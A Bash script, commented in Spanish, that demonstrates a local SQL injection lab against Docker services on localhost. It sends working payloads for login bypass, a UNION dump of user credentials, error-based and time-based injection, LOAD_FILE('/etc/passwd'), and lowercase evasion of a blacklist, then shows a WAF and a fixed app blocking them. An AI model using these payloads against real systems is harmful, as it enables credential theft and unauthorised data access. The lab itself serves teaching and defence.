#!/usr/bin/env bash
# ============================================================================
#  run-demo.sh  -  Reproduce las pruebas ofensivas/defensivas del laboratorio.
#  Requiere los contenedores arriba:  docker compose up -d --build
#  Uso:  bash evidencias/run-demo.sh | tee evidencias/salida.txt
# ============================================================================
set -u
VULN=http://localhost:3000
FILT=http://localhost:3002
WAF=http://localhost:8080
SEC=http://localhost:3001
line(){ printf '\n========== %s ==========\n' "$1"; }
code(){ curl -s -o /dev/null -w "%{http_code}" "$1"; }
time_(){ curl -s -o /dev/null -w "%{time_total}s" "$1"; }

line "0) Salud de los servicios"
for u in "$VULN" "$FILT" "$WAF" "$SEC"; do printf "  %-28s -> " "$u"; curl -s "$u/health" || echo "(sin /health)"; echo; done

line "1) LOGIN BYPASS (vuln :3000)"
curl -s -c /tmp/cj -o /dev/null -w "  login admin' --   -> HTTP %{http_code} (302=OK bypass)\n" \
  --data-urlencode "username=admin' -- " --data-urlencode "password=x" "$VULN/login"
printf "  panel -> "; curl -s -b /tmp/cj "$VULN/panel" | grep -oE 'FLAG\{[^}]*\}' | head -1
printf "  login seguro (:3001) mismo payload -> HTTP %s (401=rechazado)\n" "$(curl -s -o /dev/null -w '%{http_code}' --data-urlencode "username=admin' -- " --data-urlencode "password=x" "$SEC/login")"

line "2) UNION-based: volcado de usuarios (vuln)"
curl -s "$VULN/?q=zzz%27%20UNION%20SELECT%20id,username,pass_plain,password_hash,role,email%20FROM%20users--%20-" \
  | grep -oE '<h3><a[^>]*>[^<]+</a></h3>' | sed 's/<[^>]*>//g' | sed 's/^/    usuario: /' | head

line "3) Error-based (vuln): fuga de version MySQL"
curl -s "$VULN/products/1%20AND%20extractvalue(1,concat(0x7e,(SELECT%20version())))" | grep -oE 'XPATH[^<]*' | head -1 | sed 's/^/    /'

line "4) Time-based blind (vuln)"
printf "    baseline            : %s\n" "$(time_ "$VULN/api/products?minStock=5")"
printf "    UNION SELECT SLEEP(2): %s (debe ~2s)\n" "$(time_ "$VULN/api/products?minStock=0%20UNION%20SELECT%20SLEEP(2),2,3,4")"

line "5) ORDER BY / identifier injection (vuln)"
printf "    sort=price (ok)     : %s cards\n" "$(curl -s "$VULN/?sort=price&order=ASC" | grep -c 'class=\"card\"')"
printf "    sort inyectado      : "; curl -s "$VULN/?sort=(SELECT%201%20FROM%20nope)" | grep -oE "Table [^<]*doesn&#39;t exist" | head -1

line "6) Impacto FILE: LOAD_FILE (privilegio del usuario de BD)"
printf "    app_root  /etc/passwd len: "; docker compose exec -T db mysql -uapp_root -papp_root_pw -N -e "SELECT LENGTH(LOAD_FILE('/etc/passwd'));" 2>/dev/null
printf "    app_least /etc/passwd    : "; docker compose exec -T db mysql -uapp_least -papp_least_pw -N -e "SELECT IFNULL(LOAD_FILE('/etc/passwd'),'NULL (sin FILE)');" 2>/dev/null | tail -1

line "7) Filtro ingenuo (blacklist :3002) y evasion por tamper=lowercase"
printf "    'UNION SELECT' (MAYUS) -> HTTP %s (403=bloqueado)\n" "$(code "$FILT/?q=zzz%27%20UNION%20SELECT%201,2,3,4,5,6--%20-")"
printf "    'union select' (minus) -> inyecta: "; curl -s "$FILT/?q=zzz%27%20union%20select%20id,username,pass_plain,password_hash,role,email%20from%20users--%20-" | grep -oE '<h3><a[^>]*>[^<]+</a></h3>' | sed 's/<[^>]*>//g' | head -1

line "8) WAF ModSecurity/CRS (:8080)"
printf "    normal  /?q=teclado         -> HTTP %s\n" "$(code "$WAF/?q=teclado")"
printf "    UNION SELECT                -> HTTP %s (403)\n" "$(code "$WAF/?q=zzz%27%20UNION%20SELECT%201,2,3,4,5,6--%20-")"
printf "    union select (lowercase)    -> HTTP %s (403, CRS normaliza)\n" "$(code "$WAF/?q=zzz%27%20union%20select%201,2,3,4,5,6--%20-")"

line "9) Remediacion (:3001) resiste"
printf "    UNION SELECT -> %s cards (0=sin fuga)\n" "$(curl -s "$SEC/?q=zzz%27%20UNION%20SELECT%20id,username,pass_plain,password_hash,role,email%20FROM%20users--%20-" | grep -c 'class=\"card\"')"
echo
echo "========== FIN =========="
